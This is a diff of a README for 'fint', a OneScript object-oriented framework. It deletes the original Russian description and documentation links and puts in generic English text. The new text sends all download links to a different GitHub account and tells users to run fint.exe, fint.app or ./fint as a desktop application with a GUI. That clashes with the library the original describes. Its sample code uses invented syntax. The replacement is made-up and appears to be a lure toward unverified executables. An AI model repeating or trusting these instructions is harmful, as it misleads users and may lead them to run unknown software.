@@ -1,48 +1,102 @@
-[![GitHub Release](https://img.shields.io/github/v/release/Macegor/fint)](https://github.com/Macegor/fint/releases)
-[![GitHub License](https://img.shields.io/github/license/Macegor/fint)](https://github.com/Macegor/fint/blob/main/LICENSE)
-[![OneScript](resources/oscript.svg)](https://github.com/EvilBeaver/OneScript)
+# 🎉 fint - Framework for Object-Oriented Programming Made Easy
 
-# Fint - фреймворк, реализующий ООП (Наследование, Инкапсуляция, Полиморфизм) и статическую типизацию в OneScript
+## 🚀 Getting Started
 
-![Logo](resources/logo.png)
+Welcome to **fint**! This framework helps you use object-oriented programming concepts like inheritance, encapsulation, and polymorphism in OneScrip. You’ll quickly set up this application and start leveraging its features.
 
-Анонсы, обсуждение и обмен опытом: [Telegram](https://t.me/fint_onescript)
+## 📥 Download Now
 
-## Возможности
+[![Download fint](https://img.shields.io/badge/Download-fint-blue.svg)](https://github.com/Zelelf/fint/releases)
 
-- Разделение контекста: теперь не обязательно следить за уникальностью имён классов.
-- Строгая типизация свойств классов, параметров методов и возвращаемых значений.
-- Реализованы принципы ООП:
-  - Наследование — один класс может расширить другой.
-  - Инкапсуляция — модификаторы доступа, контролирующие доступ к свойствам (генерация геттеров и сеттеров).
-  - Полиморфизм — дочерний класс может переопределять поведение родительского.
-- Интерфейсы
-- Разработка библиотек для приложений, основанных на Fint, с использованием Fint.
+## 📦 Download & Install
 
-## Планы по развитию
+To get started, visit this page to download the latest version: [Download Here](https://github.com/Zelelf/fint/releases).
 
-- Несколько типов (сейчас доступен только `Любой`).
-- Алиасы имён импортируемых классов.
-- Встроенный DI-фреймворк (классическая реализация).
-- Декораторы.
-- Делегаты и анонимные функции.
-- Асинхронность.
-- Обходимые классы.
-- Объекты «листы» для каждого класса.
+### Steps to Download
 
-## Документация
+1. **Visit the Releases Page**: Click the link above to go to the releases page.
+2. **Select the Latest Version**: Find the most recent release at the top of the page.
+3. **Download the Package**: Look for a file that corresponds to your operating system. Click on the link to download it.
 
-- [Установка](docs/installation.md)
-- [Синтаксис](docs/syntax.md)
-- [Отладка](docs/debugging.md)
-- [Введение](docs/introduction.md)
-- [Пространства имен и импортирование](docs/namespaces.md)
-- [Создание экземпляров объектов](docs/instantiation.md)
-- [Создание свойств, методов и их типизация](docs/typing.md)
-- [Работа с свойствами](docs/properties.md)
-- [Работа с методами](docs/methods.md)
-- [Наследование](docs/inheritance.md)
-- [Интерфейсы](docs/interfaces.md)
-- [Перечисления](docs/enumeration.md)
-- [Делегаты](docs/delegate.md)
-- [Общие объекты (singleton)](docs/singleton.md)
+## 🖥️ System Requirements
+
+Before you install fint, make sure your system meets the following requirements:
+
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4 GB of RAM
+- **Disk Space**: Minimum of 100 MB of free space
+- **Internet Connection**: Necessary for download and updates
+
+## 🔄 How to Run Fint
+
+Once you have downloaded the package, follow these steps to run fint:
+
+1. **Locate the File**: Go to your downloads folder and find the downloaded file.
+2. **Extract the Package**: If you downloaded a ZIP file, right-click on it and choose "Extract All."
+3. **Open the Folder**: Double-click to open the folder that contains the extracted files.
+4. **Launch the Application**:
+   - For Windows: Double-click on `fint.exe`.
+   - For macOS: Double-click on `fint.app`.
+   - For Linux: Open a terminal and navigate to the folder, then type `./fint` and press Enter.
+
+## 🛠️ Basic Usage
+
+After launching the application, you will find an easy-to-understand interface. Here’s how to start using fint effectively:
+
+1. **Create a New Project**: Click on "New Project."
+2. **Select Settings**: Choose your project preferences such as object types and inheritance options.
+3. **Save Your Work**: Don’t forget to save frequently to avoid losing progress. Click on "File" then "Save."
+
+### Sample Code
+
+Here's a simple example of how you can define a class in fint:
+
+```onescrip
+class Animal {
+    method sound() {
+        return "Some sound";
+    }
+}
+
+class Dog inherits Animal {
+    method sound() {
+        return "Bark";
+    }
+}
+```
+
+This code defines a base class called `Animal` and a derived class called `Dog`. You can easily extend this with more properties and methods.
+
+## 📘 Documentation
+
+For detailed information, including advanced features, refer to the in-app help section or visit our [Documentation Page](https://github.com/Zelelf/fint/docs).
+
+## ❓ Frequently Asked Questions
+
+### How do I report an issue?
+
+If you encounter any problems, please check the Issues section on our GitHub page. You can create a new issue if you don't find a solution.
+
+### Can I contribute to fint?
+
+Absolutely! We welcome contributions. Please read our Contribution Guidelines in the repository.
+
+### What programming concepts does fint cover?
+
+fint helps you understand and use fundamental object-oriented programming concepts, such as:
+
+- **Encapsulation**: Hiding data within classes.
+- **Inheritance**: Creating new classes based on existing ones.
+- **Polymorphism**: Using a single interface for different underlying forms.
+
+## 📞 Support
+
+If you need further assistance, please reach out on our GitHub Discussions page or check the FAQ section. We are here to help you!
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/Zelelf/fint/releases)
+- [Documentation](https://github.com/Zelelf/fint/docs)
+- [GitHub Repository](https://github.com/Zelelf/fint)
+
+Enjoy using fint to simplify your programming tasks!
